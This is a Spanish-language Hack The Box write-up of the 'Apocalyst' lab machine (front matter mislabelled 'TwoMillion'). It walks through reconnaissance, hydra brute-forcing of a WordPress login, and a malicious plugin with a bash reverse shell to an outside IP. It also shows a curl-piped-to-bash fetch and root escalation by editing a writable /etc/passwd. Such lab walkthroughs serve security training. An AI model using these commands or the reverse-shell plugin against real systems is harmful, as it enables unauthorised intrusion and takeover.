---
layout: single
title: TwoMillion - Hack The Box
excerpt: "Explotación de Api"
date: 2024-01-03
classes: wide
header:
  teaser: /assets/images/htb-apocalyst/apocalyst1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - nginx
  - API
  - kernel
---

# 10.10.10.46 - Apocalist

![](/assets/images/htb-apocalyst/apocalyst1.png)

------------------------------
# Reconocimiento inicial

Primero lanzamos nmap:

```bash
$: sudo nmap -sCV 10.10.10.46 -p- --open -sS --min-rate 5000 -Pn -n -vvv
...
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Luego un [script mío personalizado](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/python_portscanner.md) para obtener mas información y whatweb

```bash
$: portscan.py -t 10.10.10.46 -p 22,80

[+] El puerto 22 esta abierto:
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2


[+] El puerto 80 esta abierto:
HTTP/1.0 200 OK
Date: Tue, 09 Jan 2024 09:15:18 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://apocalyst.htb/?rest_route=/>; rel="https://api.w.org/"
Connection: close
Content-Type: text/html; charset=UTF-8

$: whatweb http://apocalyst.htb/
http://apocalyst.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2
.4.18 (Ubuntu)], IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,
], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
```

Sin lugar a duda tenemos un worpress 4.8. En el `/etc/hosts` escribimos la linea `10.10.10.46	apocalyst.htb`
![](/assets/images/htb-apocalyst/apocalyst2.png)
Encontramos un articulo escrito por un tal `falaraki`, adenás en el código fuente estos links
```bash
$: curl -s http://apocalyst.htb/ | grep -oP 'a href="(.*?)"' | grep "apocalyst" | sort -u
a href="#content"
a href="http://apocalyst.htb/"
a href="http://apocalyst.htb/?cat=1"
a href="http://apocalyst.htb/?feed=comments-rss2"
a href="http://apocalyst.htb/?feed=rss2"
a href="http://apocalyst.htb/?p=5"
a href="http://apocalyst.htb/?p=7"
a href="http://apocalyst.htb/?p=9"
a href="http://apocalyst.htb/wp-login.php"
```
- La página principal, seguro `ìndex.php` acepta paráemtros como `p`, `cat`, `feed`... los cuales cargan determinados recursos, lo que me sugiere una posible LFI o una SQLi, pero tras un rato haciendo pruebas no doy con nada.
- Tenemos una opcion para subir comentarios `http://apocalyst.htb/wp-comments-post.php`, lo que tambien sugiere un XXS, pero tampoco.

Probamos un escaneo con wpscan
```bash
$: wpscan --url http://apocalyst.htb/ -e vp,u
...
[+] URL: http://apocalyst.htb/ [10.10.10.46]
[+] Started: Tue Jan  9 16:08:54 2024
...
[+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] falaraki
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
Nos ha encontrado lo del usaurio `falaraki` y que el `xmlrpc` está activado, si no podemos ir por otro camino, internaremos explotar esto.

------------------------------------------------------------

# Explotación de la web

En `/wp-login`, si pruebo un usuario `test` da un mensaje de error, pero con un usuario del sitio (el `falaraki` de antes) da otro mensaje distinto,
lo que deja la puerta abierta a fuerza bruta con hydra, pero con el rockyou no obtendo resultados.
![](/assets/images/htb-apocalyst/apocalyst3.png)

```bash
$: hydra -l falaraki -P /usr/share/wordlists/rockyou.txt apocalyst.htb http-post-form \
 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:F=is incorrect"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-09 11:33:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 486 login tries (l:1/p:486), ~31 tries per task
[DATA] attacking http-post-form://apocalyst.htb:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirec
```
Ahora probamos con fuzzing de rutas. Con el parámetro `-L` seguimos la redirección.

```bash
$: wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://apocalyst.htb/FUZZ
000000018:   301        9 L      28 W       313 Ch      "blog"                                                
000000085:   301        9 L      28 W       313 Ch      "page"                                                
000000071:   301        9 L      28 W       313 Ch      "info"                                                
000000063:   301        9 L      28 W       313 Ch      "main"                                                
000000139:   301        9 L      28 W       313 Ch      "site"   

$: wfuzz --hc=404 --hw=17 -L -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://apocalyst.htb/FUZZ
000000227:   200        0 L      0 W        0 Ch        "wp-content"                                          
000000772:   200        200 L    2015 W     40841 Ch    "wp-includes" 
```
Como no encontramos gran cosa y la web tiene palabras propias en lugar del clásico "Lorem Ipsum", probamos a hacer un diccionario con `cewl`

```bash
$: cewl http://apocalyst.htb/ -w dict.txt
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                       
$: wc -l dict.txt
533 dict2.txt

$: wfuzz --hc=404 -w dict.txt http://apocalyst.htb/FUZZ
000000001:   301        9 L      28 W       312 Ch      "the"
000000036:   301        9 L      28 W       314 Ch      "Mosis"
000000031:   301        9 L      28 W       312 Ch      "End"
000000007:   301        9 L      28 W       313 Ch      "Blog"
000000035:   301        9 L      28 W       318 Ch      "Assumptio"

$: wfuzz --hc=404 -L -w dict.txt http://apocalyst.htb/FUZZ
000000001:   200        13 L     17 W       157 Ch      "the"
000000007:   200        13 L     17 W       157 Ch      "Blog"
000000028:   200        13 L     17 W       157 Ch      "has"
000000031:   200        13 L     17 W       157 Ch      "End"
000000029:   200        13 L     17 W       157 Ch      "been"

$: wfuzz --hc=404 --hw=17 -L -w dict.txt http://apocalyst.htb/FUZZ
000000465:   200        14 L     20 W       175 Ch      "Rightiousness"
```
Una imagen descargada de `/Rightiousness` ocupa mas que otrea por ejemplo de `/End`
![](/assets/images/htb-apocalyst/apocalyst4.png)

```bash
$: ls -la
.rw-r--r-- jessica jessica 210 KB Tue Jan  9 11:22:24 2024  Rightiousness.jpg
.rw-r--r-- jessica jessica 203 KB Tue Jan  9 11:22:39 2024  End.jpg

$: steghide info Rightiousness.jpg
"Rightiousness.jpg":
  format: jpeg
  capacity: 13.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "list.txt":

$: steghide extract -sf Rightiousness.jpg
Enter passphrase: 
wrote extracted data to "list.txt".

$: hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=
Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:F=is incorrect"
...
[80][http-post-form] host: apocalyst.htb   login: falaraki   password: Transclisiation
```
Al ser un worpdress, podriamos haberlo hecho tambien con `wpscan --url http://apocalyst.htb -U falaraki -P ./list.txt`

Ya hemos llegado al panel de administración, hay varias maneras de saltar a la maquina victima, pero utilizaré una que usé en el EJPT
1. Creamos un plugin malicioso `revsell.php`
```bash
<?php
/*
Plugin Name: Mi Plugin
Description: Un plugin de muestra para WordPress.
Version: 1.0
Author: Tu Nombre
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'"); ?>
```
2. Lo zipeamos `zip plugin.zip revsel.php`
3. Lo subimos, le damos a activar y recibimos la shell
![](/assets/images/htb-apocalyst/apocalyst5.png)
```bash
$: sudo nc -nlvp 443
[sudo] password for jessica:
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.46] 49388
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@apocalyst:/var/www/html/apocalyst.htb/wp-admin$
```

----------------------------------------

# Escalada de privilegios

Subo [mi herramienta de enumeración linux](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/lin_info.sh) y encuentro que tenemos tanto la contraseña de la base de datos de wordpress (posiblemente la contraseña
de falaraki encriptada) y que el `/etc/passwd` tiene permisos de escritura, lo que nos regala la escalda de privilegios
```bash
www-data@apocalyst:/var/www/html/apocalyst.htb$ curl http://10.10.14.12/lin_info.sh | bash
...
  >  Archvos de configuracion con permiso de escritura
/etc/passwd
  >  Archivos de configuracion
[*] NGINX
[*] APACHE
[*] WORPRESS # wp-config.php
define('DB_NAME', 'wp_myblog');
define('DB_USER', 'root');
define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');
```
Creamos una contraseña con `openssl` y sustuituimos la contraseña `x` de root en el `/etc/passwd` (`root:x:0:0:root:/root:/usr/bin/zsh`) por
el hash que nos da openssl `8IiUy38KD.87M`, 
```bash
www-data@apocalyst:/$ openssl passwd
Password: test
Verifying - Password: 
8IiUy38KD.87M

www-data@apocalyst:/$ vim /etc/passwd
```
Y cambiamos a root con la contraseña `test` 
